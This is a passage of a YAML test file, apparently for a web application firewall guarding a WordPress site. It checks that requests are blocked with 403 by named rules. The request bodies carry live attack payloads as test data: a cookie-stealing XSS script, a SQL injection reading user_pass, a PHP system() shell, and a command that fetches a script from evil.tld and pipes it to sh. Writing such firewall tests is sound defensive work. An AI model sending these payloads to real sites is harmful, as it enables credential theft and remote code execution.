  expect:
    status: 403
    terminating_rule: WordPressBlockUserEnumQuery
- id: wp-user-enum-rest
  site: p-wordpress
  request:
    path: /wp-json/wp/v2/users
  expect:
    status: 403
    terminating_rule: WordPressBlockUserEnumRest
- id: wp-user-enum-route
  site: p-wordpress
  request:
    path: /?rest_route=/wp/v2/users
  expect:
    status: 403
    terminating_rule: WordPressBlockUserEnumRestRoute
- id: wp-readme
  site: p-wordpress
  request:
    path: /readme.html
  expect:
    status: 403
    terminating_rule: WordPressBlockFingerprintFiles
- id: wp-plugin-readme
  site: p-wordpress
  request:
    path: /wp-content/plugins/contact-form-7/readme.txt
  expect:
    status: 403
    terminating_rule: WordPressBlockFingerprintFiles
- id: wp-comment-xss
  site: p-wordpress
  request:
    method: POST
    path: /wp-comments-post.php
    body: comment=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&comment_post_ID=12
  expect:
    status: 403
    terminating_rule: WordPressXssBodyOutsideEditor
- id: wp-comment-sqli
  site: p-wordpress
  request:
    method: POST
    path: /wp-comments-post.php
    body: comment=1%27+union+select+user_pass+from+wp_users--+-&comment_post_ID=12
  expect:
    status: 403
    terminating_rule: WordPressSqliBodyOutsideEditor
- id: wp-body-php
  site: p-wordpress
  request:
    method: POST
    path: /?x=1
    body: a=%3C%3Fphp+system(%24_GET%5Bc%5D)%3B+%3F%3E
  expect:
    status: 403
    terminating_rule: WordPressPhpBodyOutsideEditor
- id: wp-ajax-shell
  site: p-wordpress
  request:
    method: POST
    path: /wp-admin/admin-ajax.php
    body: action=x&cmd=%3Bcurl+http%3A%2F%2Fevil.tld%2Fs.sh%7Csh
  expect:
    status: 403
    terminating_rule: WordPressShellBodyOutsideEditor
- id: web-env
  site: p-wordpress
  request:
    path: /.env
  expect:
    status: 403
    terminating_rule: BlockSensitiveFiles
- id: web-git
  site: p-wordpress
